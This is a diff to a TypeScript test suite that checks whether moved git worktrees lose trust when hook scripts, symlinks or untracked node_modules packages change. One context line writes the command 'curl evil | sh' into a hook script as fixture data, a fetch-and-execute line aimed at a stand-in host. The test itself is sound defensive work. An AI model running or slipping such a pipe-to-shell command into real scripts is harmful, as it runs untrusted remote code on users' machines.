@@ -13,7 +13,7 @@ import { FakeAccounts, makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
 import { Scheduler } from '../../src/schedules.ts';
 import { nullLogger } from '../../src/log.ts';
 import { movedSchedules, type MoveRow } from '../../src/moves.ts';
-import { setupChangedByMove, trustTouchedByMove } from '../../src/runner/moves.ts';
+import { dropUntrackedPackages, setupChangedByMove, trustTouchedByMove } from '../../src/runner/moves.ts';
 import { PatchTrust } from '../../src/patch-trust.ts';
 import { execFileSync } from 'node:child_process';
 import type { Account } from '../../src/protocol.ts';
@@ -342,6 +342,12 @@ test("a moved worktree that changes what trust covers is held to the stored hash
   const w2 = { ...w, base: base2 };
   fs.writeFileSync(path.join(wt, 'sub', 'hook.sh'), 'curl evil | sh\n');
   assert.equal(await trustTouchedByMove(w2, home, undefined, path.join(wt, 'sub')), true, 'the hook script, from the subfolder');
+  // A link that points an unchanged path somewhere else.
+  g(wt, 'reset', '-q', '--hard', base2);
+  fs.rmSync(path.join(wt, 'a.txt'));
+  fs.symlinkSync('scripts/setup.sh', path.join(wt, 'a.txt'));
+  assert.equal(await trustTouchedByMove(w2, home), true, 'a changed symlink');
+  fs.rmSync(path.join(wt, 'a.txt'));
   // A committed package.
   g(wt, 'reset', '-q', '--hard', base2);
   fs.mkdirSync(path.join(wt, 'node_modules', 'p'), { recursive: true });
@@ -382,4 +388,26 @@ test("a moved worktree that changes what trust covers is held to the stored hash
   assert.equal(trust.checkClaude(wt).trusted, false);
   trust.vouch(wt);
   assert.equal((await trust.check(copy, 0)).trusted, true, 'made afresh: trusted as the checkout is');
+});
+
+test("an older runner's staged worktree loses untracked packages at adopt, and a linked node_modules is left alone", async () => {
+  const repo = fs.realpathSync(tmpDir('tb-move-pkgs-'));
+  const g = (...a: string[]) => execFileSync('git', ['-C', repo, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' }).trim();
+  g('init', '-q');
+  fs.writeFileSync(path.join(repo, 'a.txt'), 'a\n');
+  fs.mkdirSync(path.join(repo, 'committed', 'node_modules', 'c'), { recursive: true });
+  fs.writeFileSync(path.join(repo, 'committed', 'node_modules', 'c', 'index.js'), 'ok()\n');
+  g('add', '-A');
+  g('commit', '-qm', 'a');
+  fs.mkdirSync(path.join(repo, 'node_modules', 'p'), { recursive: true });
+  fs.writeFileSync(path.join(repo, 'node_modules', 'p', 'index.js'), 'evil()\n');
+  const elsewhere = fs.realpathSync(tmpDir('tb-move-linked-'));
+  fs.mkdirSync(path.join(elsewhere, 'q'));
+  fs.writeFileSync(path.join(elsewhere, 'q', 'index.js'), 'mine()\n');
+  fs.mkdirSync(path.join(repo, 'runner'));
+  fs.symlinkSync(elsewhere, path.join(repo, 'runner', 'node_modules'));
+  await dropUntrackedPackages(repo);
+  assert.equal(fs.existsSync(path.join(repo, 'node_modules', 'p', 'index.js')), false);
+  assert.equal(fs.existsSync(path.join(repo, 'committed', 'node_modules', 'c', 'index.js')), true, 'tracked stays');
+  assert.equal(fs.existsSync(path.join(elsewhere, 'q', 'index.js')), true, 'a linked one is never followed');
 });
